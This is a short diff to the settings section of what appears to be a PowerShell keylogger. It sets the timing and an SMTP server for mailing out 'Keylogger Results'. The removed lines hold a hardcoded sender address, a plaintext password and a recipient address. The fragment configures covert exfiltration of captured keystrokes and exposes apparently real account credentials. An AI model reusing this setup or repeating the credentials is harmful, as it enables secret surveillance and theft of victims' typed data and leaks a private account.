@@ -1,10 +1,6 @@
 # Edit only this section!
 $TimesToRun = 1
 $RunTimeP = 1                       # Time in minutes
-$From = "jorgeramonalejandro@gmail.com"
-$Pass = "781Machado.#@"
-$To = "diegoles2006@gmail.com"
-$Subject = "Keylogger Results"
 $body = "Keylogger Results"
 $SMTPServer = "smtp.mail.com"
 $SMTPPort = "587"
